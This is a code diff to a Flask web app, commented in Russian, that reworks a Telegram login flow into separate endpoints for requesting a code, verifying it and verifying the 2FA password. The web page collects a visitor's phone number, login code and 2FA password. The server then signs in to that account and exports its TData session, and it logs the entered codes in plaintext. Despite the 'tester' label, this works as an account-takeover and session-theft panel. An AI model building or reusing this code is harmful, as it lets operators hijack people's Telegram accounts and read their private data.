@@ -190,6 +190,9 @@ def load_api_keys():
 API_ID, API_HASH, SECRET_KEY = load_api_keys()
 app.secret_key = SECRET_KEY
 
+# Хранилище активных сессий
+ACTIVE_SESSIONS = {}
+
 class TelegramAuthTester:
     def __init__(self):
         self.api_id = None
@@ -216,6 +219,204 @@ class TelegramAuthTester:
         except Exception as e:
             logger.error(f"❌ Ошибка инициализации: {e}")
             self.initialized = False
+    
+    async def request_code(self, phone_number):
+        """Запрос кода аутентификации"""
+        if not self.initialized:
+            return {'success': False, 'error': 'Клиент не инициализирован'}
+            
+        client = None
+        try:
+            # Создаем уникальное имя сессии
+            session_id = f"{phone_number}_{int(time.time())}"
+            
+            # Создаем клиента
+            client = Client(
+                name=session_id,
+                api_id=self.api_id,
+                api_hash=self.api_hash,
+                in_memory=True
+            )
+            
+            await client.connect()
+            
+            # Запрашиваем код
+            logger.info(f"📱 Запрос кода для: {phone_number}")
+            sent_code = await client.send_code(phone_number)
+            
+            # Сохраняем сессию
+            ACTIVE_SESSIONS[session_id] = {
+                'client': client,
+                'phone': phone_number,
+                'phone_code_hash': sent_code.phone_code_hash,
+                'created_at': time.time()
+            }
+            
+            logger.info(f"📱 Код отправлен. Session: {session_id}")
+            logger.info(f"📱 Phone code hash: {sent_code.phone_code_hash}")
+            
+            return {
+                'success': True,
+                'message': 'Код отправлен в Telegram',
+                'session_id': session_id,
+                'phone_code_hash': sent_code.phone_code_hash
+            }
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка запроса кода: {e}")
+            if client:
+                try:
+                    await client.disconnect()
+                except:
+                    pass
+            return {'success': False, 'error': f'Ошибка: {str(e)}'}
+    
+    async def verify_code(self, session_id, code):
+        """Верификация кода"""
+        if session_id not in ACTIVE_SESSIONS:
+            return {'success': False, 'error': 'Сессия не найдена или истекла'}
+            
+        session_data = ACTIVE_SESSIONS[session_id]
+        client = session_data['client']
+        phone = session_data['phone']
+        phone_code_hash = session_data['phone_code_hash']
+        
+        try:
+            logger.info(f"🔐 Верификация кода {code} для {phone}")
+            
+            # Пытаемся войти с кодом
+            await client.sign_in(
+                phone_number=phone,
+                phone_code_hash=phone_code_hash,
+                phone_code=code
+            )
+            
+            logger.info("✅ Успешная аутентификация")
+            
+            # Получаем информацию о пользователе
+            me = await client.get_me()
+            user_info = {
+                'id': me.id,
+                'phone_number': me.phone_number,
+                'first_name': me.first_name,
+                'last_name': me.last_name,
+                'username': me.username
+            }
+            
+            # Экспортируем TData
+            export_result = await self.export_tdata(client, user_info)
+            
+            # Очищаем сессию
+            await client.disconnect()
+            del ACTIVE_SESSIONS[session_id]
+            
+            if export_result['success']:
+                return {
+                    'success': True,
+                    'message': 'Аутентификация и экспорт TData успешны!',
+                    'user_info': user_info,
+                    'export_info': export_result
+                }
+            else:
+                return export_result
+                
+        except SessionPasswordNeeded:
+            logger.info("🔒 Требуется 2FA пароль")
+            # Обновляем статус сессии
+            session_data['needs_password'] = True
+            ACTIVE_SESSIONS[session_id] = session_data
+            
+            return {
+                'success': True,
+                'message': 'Требуется пароль 2FA',
+                'needs_password': True,
+                'session_id': session_id
+            }
+            
+        except PhoneCodeInvalid as e:
+            logger.warning(f"⚠️ Неверный код: {e}")
+            return {'success': False, 'error': 'Неверный код подтверждения'}
+            
+        except PhoneCodeExpired as e:
+            logger.warning(f"⏰ Код истек: {e}")
+            await client.disconnect()
+            del ACTIVE_SESSIONS[session_id]
+            return {'success': False, 'error': 'Код истек. Запросите новый.'}
+            
+        except FloodWait as e:
+            logger.warning(f"⏳ Flood wait: {e.value} секунд")
+            await client.disconnect()
+            del ACTIVE_SESSIONS[session_id]
+            return {
+                'success': False, 
+                'error': f'Слишком много попыток. Попробуйте через {e.value} секунд.'
+            }
+            
+        except Exception as e:
+            logger.error(f"❌ Ошибка верификации: {e}")
+            try:
+                await client.disconnect()
+            except:
+                pass
+            if session_id in ACTIVE_SESSIONS:
+                del ACTIVE_SESSIONS[session_id]
+            return {'success': False, 'error': f'Ошибка: {str(e)}'}
+    
+    async def verify_password(self, session_id, password):
+        """Верификация пароля 2FA"""
+        if session_id not in ACTIVE_SESSIONS:
+            return {'success': False, 'error': 'Сессия не найдена'}
+            
+        session_data = ACTIVE_SESSIONS[session_id]
+        if not session_data.get('needs_password'):
+            return {'success': False, 'error': 'Неверный статус сессии'}
+            
+        client = session_data['client']
+        
+        try:
+            logger.info("🔑 Верификация пароля 2FA")
+            
+            # Входим с паролем
+            await client.check_password(password=password)
+            
+            logger.info("✅ Успешная аутентификация с паролем 2FA")
+            
+            # Получаем информацию о пользователе
+            me = await client.get_me()
+            user_info = {
+                'id': me.id,
+                'phone_number': me.phone_number,
+                'first_name': me.first_name,
+                'last_name': me.last_name,
+                'username': me.username
+            }
+            
+            # Экспортируем TData
+            export_result = await self.export_tdata(client, user_info)
+            
+            # Очищаем сессию
+            await client.disconnect()
+            del ACTIVE_SESSIONS[session_id]
+            
+            if export_result['success']:
+                return {
+                    'success': True,
+                    'message': 'Аутентификация и экспорт TData успешны!',
+                    'user_info': user_info,
+                    'export_info': export_result
+                }
+            else:
+                return export_result
+                
+        except Exception as e:
+            logger.error(f"❌ Ошибка верификации пароля: {e}")
+            try:
+                await client.disconnect()
+            except:
+                pass
+            if session_id in ACTIVE_SESSIONS:
+                del ACTIVE_SESSIONS[session_id]
+            return {'success': False, 'error': 'Неверный пароль 2FA'}
     
     async def export_tdata(self, client, user_info, request_info=None):
         """Экспорт TData"""
@@ -291,73 +492,6 @@ class TelegramAuthTester:
         except Exception as e:
             logger.error(f"❌ Ошибка экспорта TData: {e}")
             return {'success': False, 'error': f'Ошибка экспорта: {str(e)}'}
-    
-    async def full_auth_and_export(self, phone_number, code, password_2fa=None, request_info=None):
-        """Полная аутентификация и экспорт TData"""
-        client = None
-        try:
-            # Создаем временного клиента
-            session_name = f"temp_session_{int(time.time())}"
-            client = Client(
-                name=session_name,
-                api_id=self.api_id,
-                api_hash=self.api_hash,
-                in_memory=True
-            )
-            
-            await client.connect()
-            
-            # Запрашиваем код
-            sent_code = await client.send_code(phone_number)
-            
-            # Входим с кодом
-            await client.sign_in(
-                phone_number=phone_number,
-                phone_code_hash=sent_code.phone_code_hash,
-                phone_code=code
-            )
-            
-            # Если требуется 2FA
-            if password_2fa:
-                await client.check_password(password_2fa)
-            
-            # Получаем информацию о пользователе
-            me = await client.get_me()
-            user_info = {
-                'id': me.id,
-                'phone_number': me.phone_number,
-                'first_name': me.first_name,
-                'last_name': me.last_name,
-                'username': me.username
-            }
-            
-            # Экспортируем TData
-            export_result = await self.export_tdata(client, user_info, request_info)
-            
-            await client.disconnect()
-            
-            if export_result['success']:
-                return {
-                    'success': True,
-                    'message': 'Аутентификация и экспорт TData успешны!',
-                    'user_info': user_info,
-                    'export_info': export_result
-                }
-            else:
-                return export_result
-                
-        except SessionPasswordNeeded:
-            logger.info("🔒 Требуется 2FA пароль")
-            return {
-                'success': True,
-                'message': 'Требуется пароль 2FA',
-                'needs_password': True
-            }
-        except Exception as e:
-            if client:
-                await client.disconnect()
-            logger.error(f"❌ Ошибка аутентификации: {e}")
-            return {'success': False, 'error': f'Ошибка аутентификации: {str(e)}'}
 
 # Инициализация
 auth_tester = TelegramAuthTester()
@@ -550,13 +684,10 @@ def home():
             btn.textContent = 'Отправка...';
 
             try {{
-                const response = await fetch('/api/auth/export-tdata', {{
+                const response = await fetch('/api/auth/request-code', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify({{
-                        phone: phone,
-                        code: '00000'  // Заглушка, код введем позже
-                    }})
+                    body: JSON.stringify({{phone: phone}})
                 }});
                 
                 if (!response.ok) {{
@@ -566,9 +697,10 @@ def home():
                 
                 const data = await response.json();
                 
-                if (data.success || data.needs_password) {{
+                if (data.success) {{
+                    currentSessionId = data.session_id;
                     showStep(2);
-                    showAlert('✅ Код отправлен! Проверьте Telegram и введите код.', 'success');
+                    showAlert('✅ Код отправлен в Telegram! Проверьте приложение и введите код.', 'success');
                     document.getElementById('code').focus();
                 }} else {{
                     showAlert('❌ ' + data.error, 'error');
@@ -595,11 +727,11 @@ def home():
             btn.textContent = 'Проверка...';
 
             try {{
-                const response = await fetch('/api/auth/export-tdata', {{
+                const response = await fetch('/api/auth/verify-code', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
                     body: JSON.stringify({{
-                        phone: currentPhone,
+                        session_id: currentSessionId,
                         code: code
                     }})
                 }});
@@ -617,9 +749,12 @@ def home():
                         showAlert('🔒 Требуется пароль двухфакторной аутентификации', 'info');
                         document.getElementById('password').focus();
                     }} else {{
-                        showAlert('✅ ' + data.message + ' TData экспортирован!', 'success');
+                        showAlert('✅ ' + data.message, 'success');
                         if (data.user_info) {{
                             showAlert('👤 Пользователь: ' + data.user_info.first_name + ' (@' + data.user_info.username + ')', 'info');
+                        }}
+                        if (data.export_info) {{
+                            showAlert('💾 TData экспортирован! Session ID: ' + data.export_info.session_id, 'success');
                         }}
                     }}
                 }} else {{
@@ -647,13 +782,12 @@ def home():
             btn.textContent = 'Проверка...';
 
             try {{
-                const response = await fetch('/api/auth/export-tdata', {{
+                const response = await fetch('/api/auth/verify-password', {{
                     method: 'POST',
                     headers: {{'Content-Type': 'application/json'}},
                     body: JSON.stringify({{
-                        phone: currentPhone,
-                        code: '00000',  // Код уже введен на предыдущем шаге
-                        password_2fa: password
+                        session_id: currentSessionId,
+                        password: password
                     }})
                 }});
                 
@@ -665,9 +799,12 @@ def home():
                 const data = await response.json();
                 
                 if (data.success) {{
-                    showAlert('✅ ' + data.message + ' TData экспортирован!', 'success');
+                    showAlert('✅ ' + data.message, 'success');
                     if (data.user_info) {{
                         showAlert('👤 Пользователь: ' + data.user_info.first_name + ' (@' + data.user_info.username + ')', 'info');
+                    }}
+                    if (data.export_info) {{
+                        showAlert('💾 TData экспортирован! Session ID: ' + data.export_info.session_id, 'success');
                     }}
                 }} else {{
                     showAlert('❌ ' + data.error, 'error');
@@ -698,9 +835,10 @@ def home():
 </html>
 '''
 
-@app.route('/api/auth/export-tdata', methods=['POST', 'OPTIONS'])
-def export_tdata():
-    """Аутентификация и экспорт TData"""
+# 🎯 API Endpoints
+@app.route('/api/auth/request-code', methods=['POST', 'OPTIONS'])
+def request_code():
+    """Запрос кода аутентификации"""
     if request.method == 'OPTIONS':
         return jsonify({'status': 'ok'})
         
@@ -710,25 +848,63 @@ def export_tdata():
             return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
             
         phone = data.get('phone', '').strip()
-        code = data.get('code', '').strip()
-        password_2fa = data.get('password_2fa', '')
         
         if not phone:
             return jsonify({'success': False, 'error': 'Введите номер телефона'}), 400
         
-        # Информация о запросе для логирования
-        request_info = {
-            'ip': request.remote_addr,
-            'user_agent': request.headers.get('User-Agent')
-        }
-        
-        result = async_runner.run_coroutine(
-            auth_tester.full_auth_and_export(phone, code, password_2fa, request_info)
-        )
+        result = async_runner.run_coroutine(auth_tester.request_code(phone))
         return jsonify(result)
         
     except Exception as e:
-        logger.error(f"❌ Ошибка экспорта TData: {e}")
+        logger.error(f"❌ Ошибка запроса кода: {e}")
+        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500
+
+@app.route('/api/auth/verify-code', methods=['POST', 'OPTIONS'])
+def verify_code():
+    """Верификация кода"""
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'ok'})
+        
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
+            
+        session_id = data.get('session_id', '').strip()
+        code = data.get('code', '').strip()
+        
+        if not session_id or not code:
+            return jsonify({'success': False, 'error': 'Введите код'}), 400
+        
+        result = async_runner.run_coroutine(auth_tester.verify_code(session_id, code))
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"❌ Ошибка верификации кода: {e}")
+        return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500
+
+@app.route('/api/auth/verify-password', methods=['POST', 'OPTIONS'])
+def verify_password():
+    """Верификация пароля 2FA"""
+    if request.method == 'OPTIONS':
+        return jsonify({'status': 'ok'})
+        
+    try:
+        data = request.get_json()
+        if not data:
+            return jsonify({'success': False, 'error': 'No JSON data provided'}), 400
+            
+        session_id = data.get('session_id', '').strip()
+        password = data.get('password', '')
+        
+        if not session_id or not password:
+            return jsonify({'success': False, 'error': 'Введите пароль'}), 400
+        
+        result = async_runner.run_coroutine(auth_tester.verify_password(session_id, password))
+        return jsonify(result)
+        
+    except Exception as e:
+        logger.error(f"❌ Ошибка верификации пароля: {e}")
         return jsonify({'success': False, 'error': f'Server error: {str(e)}'}), 500
 
 @app.route('/api/storage/stats', methods=['GET'])
